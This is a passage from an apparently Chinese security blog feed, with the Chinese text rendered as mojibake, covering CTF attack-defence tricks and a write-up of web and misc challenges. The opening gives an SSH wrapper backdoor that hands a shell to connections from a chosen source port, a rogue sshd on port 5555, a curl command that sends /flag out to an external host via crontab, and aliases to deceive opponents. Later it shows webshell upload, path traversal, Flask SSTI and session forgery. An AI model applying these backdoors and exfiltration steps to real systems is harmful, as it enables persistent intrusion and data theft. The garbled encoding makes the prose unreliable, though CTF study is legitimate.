æ”¾ä¸Šä¸€ä¸ªsh.shè„šæœ¬ï¼Œé‡Œé¢å†™äº†åˆ›å»ºphpä¸æ­»é©¬çš„å‘½ä»¤ã€‚<br>ä¸‹é¢ä¸¤ç§æš‚æ—¶åˆ©ç”¨å¤±è´¥ å¯èƒ½æ˜¯è…¾è®¯äº‘çš„åŸå› ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh wrapper</span><br><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">exp:</span><br><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line">sshè½¯è¿æ¥</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;5555;</span><br><span class="line">å»ºç«‹ä¸€ä¸ªè½¯è¿æ¥ï¼Œç„¶åé€šè¿‡5555ç«¯å£è®¿é—®sshæœåŠ¡</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ“ä½œå°±æ˜¯curlå¤–å¸¦æœ¬åœ°å‘½ä»¤æ‰§è¡Œç»“æœ,è¿™ä¸ªä¹Ÿå¯ä»¥å†™åˆ°crontabé‡Œé¢ï¼Œæ¯”è¾ƒæ–¹ä¾¿çš„ä½¿ç”¨æäº¤flagçš„apiæäº¤flagã€‚ç¤ºä¾‹å¦‚ä¸‹</p><p>curl â€œhttp://:7777?flag=$(cat /flag)â€</p><h1 id="ä¸€äº›å°æŠ€å·§"><a href="#ä¸€äº›å°æŠ€å·§" class="headerlink" title="ä¸€äº›å°æŠ€å·§"></a>ä¸€äº›å°æŠ€å·§</h1><p>ç”¨æ¥è¿·æƒ‘å¯¹æ‰‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias crontab&#x3D;&quot;echo no crontab for &#96;whoami&#96; ||&quot;</span><br><span class="line">alias cat&#x3D;&quot;echo &#96;date&#96;|md5sum|cut -d &#39; &#39; -f1||&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®‰ç½‘æ¯éƒ¨åˆ†wp</title>
      <link href="2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/"/>
      <url>2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>webshellä¸Šä¼ </p><p>å‰ç«¯ç»•è¿‡ã€‚ç»•äº†åŠå¤©æ‰æƒ³èµ·æ¥æ˜¯å‰ç«¯ç»•è¿‡ã€‚ã€‚burpæ”¹ä¸ªåç¼€å°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç </span><br><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shell èšå‰‘ä¸Šä¼  cat /flag</p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><a href="http://172.20.2.4:9003/index.php?txt=../../../flag">http://172.20.2.4:9003/index.php?txt=../../../flag</a> ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç§’äº†</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>çŸ¥è¯†ç‚¹ï¼šSSTI,SSTIè¯»é…ç½®æ–‡ä»¶ï¼Œ/procç›®å½•çš„ä½œç”¨ï¼Œflask sessionä¼ªé€ </p><p>é¦–å…ˆï¼Œå°è¯•ç™»å½•172.20.2.3:9006,ç™»å½•å¤±è´¥ï¼Œè®¿é—®äº†ä¸€ä¸‹robots.txt,å‘ç°äº†æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œè§‚å¯ŸURLï¼Œè€ƒè™‘å¯èƒ½å­˜åœ¨XSSï¼Œ</p><p>image-20210511155722690.png<img src="http://cdn.polowong.top/1620813539140l7b6j4e6.png?imageslim" alt="paste image"><br>è¿™é‡Œçœ‹äº†ä¸€çœ¼ä¸­é—´ä»¶åˆ†æç»“æœï¼Œå‘ç°äº†flaskã€‚ã€‚flaskäººç‹‚å–œï¼ˆã€‚</p><p>ç›´æ¥4</p><p>image-20210511155809022.png<img src="http://cdn.polowong.top/1620813548564ty2uanbr.png?imageslim" alt="paste image"><br>æ‡‚å¾—éƒ½æ‡‚ï¼Œé“sstiäº†ï¼Œå°è¯•ä¸€æ­¥æ­¥rceï¼Œæ£€æµ‹å‘ç°æ²¡å¼€debugæ¨¡å¼ï¼Œæ‰€ä»¥åªèƒ½èµ°å¸¸è§„çš„rceåˆ©ç”¨äº†ã€‚</p><p>å½“å°è¯•åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()</span><br></pre></td></tr></table></figure><p>æ—¶å‘ç°è¢«banäº†ï¼Œå•ç‹¬æµ‹è¯•äº†ä¸‹å°æ‹¬å·ï¼Œå‘ç°æ˜¯banäº†å°æ‹¬å·ã€‚æ—¢ç„¶banäº†å°æ‹¬å·ï¼Œé‚£ä¹ˆå¸¸è§„çš„ssti rceåŸºæœ¬å°±èµ°ä¸é€šäº†ã€‚åªèƒ½è€ƒè™‘è¯»å–ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œæ¯”å¦‚configï¼Œä½¿ç”¨payload  è¯»å–configæ–‡ä»¶ï¼Œå‘ç°äº† secret_key</p><p>image-20210511160014837.png<img src="http://cdn.polowong.top/16208135773438gjedayy.png?imageslim" alt="paste image"></p><p>secret_keyçš„ä½œç”¨æ˜¯ç”Ÿæˆsessionï¼Œå…·ä½“æ­¥éª¤æˆ‘å¿˜äº†ï¼Œåæ­£æ˜¯æ ¹æ®secret_keyå¯ä»¥è¿˜åŸå’Œç”Ÿæˆå¯¹åº”çš„sessionã€‚</p><p>githubæœ‰å¯¹åº”çš„å·¥å…·ï¼Œflask session managerã€‚</p><p>æ¥ä¸‹æ¥çœ‹äº†çœ‹æºç ï¼Œ<br>image-20210511160246157.png<img src="http://cdn.polowong.top/1620813563588zor9il2b.png?imageslim" alt="paste image"></p><p>ä¸€ä¸ªç®€å•çš„å‰ç«¯éªŒè¯ï¼ŒburpæŠ“è¿”å›åŒ…æŠŠ0æ”¹æˆ1å°±è¡Œï¼Œè¿™æ ·å°±é¡ºåˆ©è¿›å…¥åå°äº†ã€‚ä½†æ˜¯è¿›å…¥åå°åæç¤ºæˆ‘ä¸æ˜¯adminï¼ˆ2333</p><p>image-20210511160330889.png<img src="http://cdn.polowong.top/16208136016557e3ok72r.png?imageslim" alt="paste image"></p><p>å¥½å§ï¼Œçœ‹èµ·æ¥æ˜¯è¦ä¼ªé€ adminçš„sessionäº†ã€‚ç°åœ¨secret_keyæœ‰äº†ï¼Œç”¨å·¥å…·å…ˆè§£å¯†å½“å‰sessionï¼ŒæŠŠç”¨æˆ·åæ”¹æˆadminåå†ç”Ÿæˆsessionã€‚å¦‚ä¸‹å›¾æ‰€ç¤º</p><p>image-20210511160731351.png<img src="http://cdn.polowong.top/1620813610364ajp4gund.png?imageslim" alt="paste image"></p><p>é‚£ä¹ˆå½“å‰ç”Ÿæˆçš„adminçš„sessionå°±æ˜¯eyJ1c2VybmFtZSI6ImFkbWluIn0.YJo7Og.7WfYqubO5M7KZ-8IXXKIp6kMf5oï¼Œedit this cookie æ¢ä¸€ä¸‹ï¼ˆæˆ‘è¿™chromeæœ‰bugï¼Œç”¨çš„firefoxï¼‰</p><p>image-20210511160841881.png<img src="http://cdn.polowong.top/16208136158740qcqf1gf.png?imageslim" alt="paste image"></p><p>å·²ç»ç»™äº†hintï¼Œè€ƒè™‘ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé¦–å…ˆå°è¯•è¯»å–/etc/passwdï¼ŒæˆåŠŸã€‚</p><p>image-20210511161046827.png<img src="http://cdn.polowong.top/16208136213232flk4by2.png?imageslim" alt="paste image"></p><p>æ¥ä¸‹æ¥å°è¯•è¯»flagã€‚ç›´æ¥/flagä¸è¡Œï¼Œå…³é”®å­—ç»™è¿‡æ»¤äº†ã€‚å¡äº†å¥½å‡ ä¸ªå°æ—¶</p><p>ç”¨äº†æŒºå¤šç»•è¿‡æ–¹æ³• /fla? /f* ç­‰ç­‰ ä½†æ˜¯å¯èƒ½ä¸­é—´æœ‰è½¬ä¹‰ä¹‹ç±»çš„ï¼Œæœ€ç»ˆä¼ åˆ°Linuxå±‚å¹¶ä¸èƒ½è¯†åˆ«é€šé…ç¬¦ï¼Œæ‰€ä»¥å¡äº†å¾ˆé•¿æ—¶é—´</p><p>æœ€åçš„æ€è·¯æ˜¯ä¹‹å‰æ¯”èµ›ä¸­è¯»flagï¼Œè¿‡æ»¤äº†å¾ˆå¤šï¼Œå¸ˆå‚…å‘Šè¯‰æˆ‘åˆ©ç”¨/proc/ç›®å½•è¯»æ–‡ä»¶ï¼Œprocç›®å½•ä»£è¡¨äº†ä¸å½“å‰è¿è¡Œè¿›ç¨‹æœ‰å…³çš„ä¿¡æ¯å¹¶ä»¥æ–‡ä»¶çš„å½¢å¼å±•ç¤ºï¼ˆå­¦ä¹ é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_45521281/article/details/114594402%EF%BC%89%EF%BC%8C%E8%80%8C/proc/self%E7%9B%AE%E5%BD%95%E4%BB%A3%E8%A1%A8%E4%BA%86%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%9C%89%E5%85%B3%E4%BF%A1%E6%81%AF%E5%B9%B6%E4%BB%A5%E6%96%87%E4%BB%B6%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%B1%95%E7%A4%BA%EF%BC%8C%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E6%9C%89fd%E3%80%81cmdline%E3%80%81cwd%E3%80%81envrion%E7%AD%89%E3%80%82">https://blog.csdn.net/qq_45521281/article/details/114594402ï¼‰ï¼Œè€Œ/proc/selfç›®å½•ä»£è¡¨äº†å½“å‰è¿›ç¨‹çš„æœ‰å…³ä¿¡æ¯å¹¶ä»¥æ–‡ä»¶çš„å½¢å¼å±•ç¤ºï¼Œéœ€è¦æ³¨æ„çš„æœ‰fdã€cmdlineã€cwdã€envrionç­‰ã€‚</a></p><p>/proc/self/cmdline ä»£è¡¨å½“å‰çš„å‘½ä»¤è¡Œè¾“å…¥å†…å®¹ï¼Œæˆ‘è¯»å–äº†ä¹‹åæ˜¯è¿™ä¸ª</p><p>image-20210511161330178.png<img src="http://cdn.polowong.top/1620813626597i04733zp.png?imageslim" alt="paste image"></p><p>å¥½å®¶ä¼™ ç»å¯¹è·¯å¾„æœ‰äº†ï¼Œç›´æ¥è¯»æ–‡ä»¶</p><p>/app/app_a384gh1.py</p><p>ç¨‹åºä»£ç å¦‚ä¸‹ï¼ŒåŸºæœ¬ä¿®å¤äº†ssti-&gt;rceï¼Œç„¶åçœ‹åˆ°äº†import  ffffffff111llllag æ–‡ä»¶ï¼Œé‚£ç›´æ¥è¯»å½“å‰/appç›®å½•ä¸‹çš„ffffffff111llllag.pyå°±å¥½äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string,redirect,render_template,session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ffffffff111llllag</span><br><span class="line"></span><br><span class="line">app = Flask(import_name=__name__,template_folder=<span class="string">&#x27;templates&#x27;</span>,static_folder=<span class="string">&#x27;static&#x27;</span>,static_url_path=<span class="string">&#x27;/static&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/admin/&#x27;</span> <span class="keyword">in</span> request.path:</span><br><span class="line">        sess_name=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">            sess_name=session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> sess_name!=<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your current account is &#x27;</span>+sess_name+<span class="string">&#x27; not admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeheader</span>(<span class="params">response</span>):</span></span><br><span class="line">    response.headers[<span class="string">&quot;X-Powered-By&quot;</span>] = <span class="string">&quot;PHP/7.2.10&quot;</span></span><br><span class="line">    response.headers[<span class="string">&quot;Hint&quot;</span>] = <span class="string">&quot;Wake up Neo, the Matrix has you&quot;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Server&#x27;</span>]=<span class="string">&#x27;Apache/2.4.35 (Win64) PHP/7.2.10&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redirect_2_index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not in session!&#x27;</span>)</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;./index.php&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/err.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">err</span>():</span></span><br><span class="line">    <span class="comment">#I patched the SSTI vulnerability.How clever I am!</span></span><br><span class="line">    errorinfo=request.args.get(<span class="string">&quot;errorinfo&quot;</span>)</span><br><span class="line">    blacklist=[<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> errorinfo:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;Oh no,there is an Error! Error info:&lt;p&gt; %s&quot;</span> % errorinfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login.php&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> username <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/backendmanage.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backendmanage</span>():</span></span><br><span class="line">    img=request.args.get(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> img:</span><br><span class="line">        img=<span class="string">&#x27;1.png&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> img:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(img, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> img_f:</span><br><span class="line">        content = img_f.read()</span><br><span class="line">        content = base64.b64encode(content)</span><br><span class="line">    content=<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> content])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Current Image:&#123;img&#125;&lt;/h1&gt;&lt;!-- ?img=1.png --&gt;&lt;img  src=&quot;data:;base64,&#123;content&#125;&quot;&gt;&#x27;</span>.<span class="built_in">format</span>(img=img,content=content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params">Exception</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_exception_handler</span>(<span class="params">e</span>):</span></span><br><span class="line">    e=<span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/err.php?errorinfo=&quot;</span>+e, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯»å–flagæ–‡ä»¶åï¼Œæ‹¿åˆ°flagã€‚</p><p>image-20210511161628308.png<img src="http://cdn.polowong.top/1620813641263aqv49hf6.png?imageslim" alt="paste image"></p><p>è¿™é¢˜æœ‰å‡ ä¸ªå‘ç‚¹ï¼Œé¦–å…ˆæ˜¯HTTPå¤´é‡Œé¢çš„PHP HEADER å®¹æ˜“è¿·æƒ‘äººï¼Œå…¶æ¬¡æ˜¯ç™»å½•é‚£çš„sqlæ³¨å…¥å®¹æ˜“è¿·æƒ‘äººï¼Œæœ€åæ˜¯FLASK-SSTIçš„åˆ©ç”¨æ–¹å¼éœ€è¦æŒæ¡å…¨é¢ï¼š</p><p>1.ç›´æ¥RCE</p><p>2.å¼€DEBUGæ—¶ï¼ŒSSTI è¯»æ–‡ä»¶-&gt;æ„é€ PINç -&gt;RCE</p><p>3.ä¼ªé€ sessionç™»å½•</p><h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>æµé‡åŒ…æ²¡çœ‹å‡ºæ¥å•¥ï¼Œç›´æ¥åˆ†ç¦»httpå¯¹è±¡å‘ç°äº†flag.phpï¼Œå‹ç¼©åŒ…è¢«ç ´åäº†ï¼Œä¿®å¤ä¸‹å¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)ï¼Œ                        ã€€ã€€æ–‡ä»¶å¤´ï¼šFFD8FFã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ–‡ä»¶å°¾ï¼šFF D9ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</span><br><span class="line">PNG (png)ï¼Œ                       ã€€ã€€ æ–‡ä»¶å¤´ï¼š89504E47ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼šAE 42 60 82</span><br><span class="line">GIF (gif)ï¼Œ                           ã€€ã€€æ–‡ä»¶å¤´ï¼š47494638ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š00 3B                                                                 ZIP Archive (zip)ï¼Œ                     æ–‡ä»¶å¤´ï¼š504B0304ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š50 4B</span><br><span class="line"></span><br><span class="line">TIFF (tif)ï¼Œ                           ã€€  æ–‡ä»¶å¤´ï¼š49492A00ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š</span><br><span class="line">Windows Bitmap (bmp)ï¼Œ      ã€€  æ–‡ä»¶å¤´ï¼š424Dã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ–‡ä»¶å°¾ï¼š</span><br><span class="line">CAD (dwg)ï¼Œ                        ã€€  æ–‡ä»¶å¤´ï¼š41433130ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š</span><br><span class="line">Adobe Photoshop (psd)ï¼Œ          æ–‡ä»¶å¤´ï¼š38425053ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š</span><br><span class="line">Rich Text Format (rtf)ï¼Œ             æ–‡ä»¶å¤´ï¼š7B5C727466ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€  æ–‡ä»¶å°¾ï¼š</span><br><span class="line">XML (xml)ï¼Œ                              æ–‡ä»¶å¤´ï¼š3C3F786D6Cã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ–‡ä»¶å°¾ï¼š</span><br><span class="line">HTML (html)ï¼Œ                           æ–‡ä»¶å¤´ï¼š68746D6C3E</span><br><span class="line">Email [thorough only] (eml)ï¼Œ     æ–‡ä»¶å¤´ï¼š44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)ï¼Œ            æ–‡ä»¶å¤´ï¼šCFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)ï¼Œ                         æ–‡ä»¶å¤´ï¼š2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)ï¼Œ      æ–‡ä»¶å¤´ï¼šD0CF11E0</span><br><span class="line">MS Access (mdb)ï¼Œ                    æ–‡ä»¶å¤´ï¼š5374616E64617264204A</span><br><span class="line">WordPerfect 